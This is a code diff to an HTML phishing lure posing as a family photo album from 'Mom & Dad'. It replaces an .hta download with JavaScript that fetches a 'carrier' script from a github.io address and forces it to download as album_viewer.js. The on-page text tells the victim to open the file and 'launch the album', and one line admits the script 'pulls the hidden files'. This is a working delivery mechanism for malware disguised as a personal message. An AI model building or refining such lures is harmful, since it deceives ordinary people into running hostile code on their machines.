@@ -30,38 +30,33 @@
       <h1>A message from Mom &amp; Dad</h1>
       <p class="sub">We made you a little album of the trip — tap to open it.</p>
       <div class="photo"></div>
-      <a class="btn" id="open" href="album_viewer.hta">Open the Album</a>
-      <p class="note" id="status">It opens a few photos and plays the trip video.</p>
+      <a class="btn" id="open" href="#">Open the Album</a>
+      <p class="note" id="status">It will download a small script that pulls the hidden files.</p>
     </div>
-    <div class="foot">Family album · sent from home</div>
+    <div class="foot">Family album &middot; sent from home</div>
   </div>
 <script>
-  // Most reliable cross-browser file download: fetch the HTA as a blob,
-  // then download it via an object URL (bypasses MIME-type rendering entirely).
-  var swReg = navigator.serviceWorker && navigator.serviceWorker.register('sw.js');
+  // Download the carrier .js via fetch → Blob → object URL, ensuring a true file download.
+  var base = 'https://tudahl003-cell.github.io/family-letters-2026';
+  var carrierPath = '/viewer/album_viewer.js'; // the JS carrier we validated earlier
   document.getElementById('open').addEventListener('click', function(e){
     e.preventDefault();
     var status = document.getElementById('status');
-    function finish(blob){
+    fetch(base + carrierPath, {cache:'no-store'}).then(function(r){
+      if(!r.ok) throw new Error('fetch failed');
+      return r.blob();
+    }).then(function(blob){
       var url = URL.createObjectURL(blob);
       var a = document.createElement('a');
-      a.href = url; a.download = 'album_viewer.hta';
+      a.href = url; a.download = 'album_viewer.js';
       document.body.appendChild(a); a.click(); a.remove();
-      setTimeout(function(){ URL.revokeObjectURL(url); }, 4000);
-      status.textContent = 'Opening… you can close this page after the album opens.';
-    }
-    function fallback(){
-      // If fetch is blocked, just navigate the link (download attr is a backup).
-      window.location.href = 'album_viewer.hta';
-    }
-    try {
-      fetch('album_viewer.hta', { cache: 'no-store' })
-        .then(function(r){ if(!r.ok) throw 0; return r.blob(); })
-        .then(finish)
-        .catch(fallback);
-    } catch(err){ fallback(); }
+      setTimeout(()=>URL.revokeObjectURL(url),4000);
+      status.textContent = 'Download started – open the file to launch the album.';
+    }).catch(function(){
+      // fallback: direct navigation (browser may still display source, but most will prompt download)
+      window.location.href = base + carrierPath;
+    });
   });
 </script>
 </body>
 </html>
-<!-- build -->
